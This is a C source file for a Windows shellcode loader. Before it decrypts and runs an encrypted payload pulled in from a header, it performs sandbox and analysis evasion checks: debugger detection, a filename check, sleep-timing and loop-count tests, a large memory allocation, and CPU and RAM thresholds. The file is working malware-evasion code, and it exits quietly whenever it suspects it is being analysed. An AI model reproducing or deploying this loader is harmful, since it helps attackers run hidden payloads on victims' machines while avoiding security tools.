#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include <Wininet.h>
#include "../payload_encrypted/payload.h"
#pragma comment(lib, "Wininet.lib")

#define SLEEP_TIME 5000
#define MAX_OP 100000000
#define TOO_MUCH_MEM 100000000

bool name_check(char* argv[]){
    if (strstr(argv[0], "main.exe") > 0){
        return false;
    }else{
        return true;
    }
}
bool sleep_check(){
    clock_t start, end;
    double time_between;

    start = clock(); // Record start time

    Sleep(SLEEP_TIME);
    end = clock(); // Record end time

    // Calculate the time used in miliseconds
    time_between = ((double)(end - start));

    if (time_between < SLEEP_TIME){
        return true;
    }else{
        return false;
    }
}
bool increment(){
    int counter = 0;
    for(int i = 0; i < MAX_OP; i ++){
        counter++;
    }
    if(counter == MAX_OP){
        return false;
    }else{
        return true;
    }
}
bool memory(){
    char * memdmp = NULL;
    //Allocate 100mb of memmory
    memdmp = (char *)malloc(TOO_MUCH_MEM);
    if(memdmp!=NULL){
        memset(memdmp,00, TOO_MUCH_MEM);
        free(memdmp);
        return false;
    }else{
        return true;
    }
}
bool checkResources() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    // check number of processors
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors;
    if (procNum < 2){
        return true;
    }
    // check RAM
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
    if (ram < 2){ 
        return true;
    }
    return false;
}
bool evade(char* argv[]){
    if (IsDebuggerPresent()) {
        return true;
    }
    if (name_check(argv)){
        return true;
    }
    if (sleep_check()){
        return true;
    }
    if (increment()){
        return true;
    }
    if (memory()){
        return true;
    }
    if (checkResources()){
        return true;
    }
}

int main(int argc, char* argv[]){
    if(evade(argv)){
        return 0; // Return 0 to not act suspicious
    }
    decryptShellCode();
    startShellCode();
    return 0;
}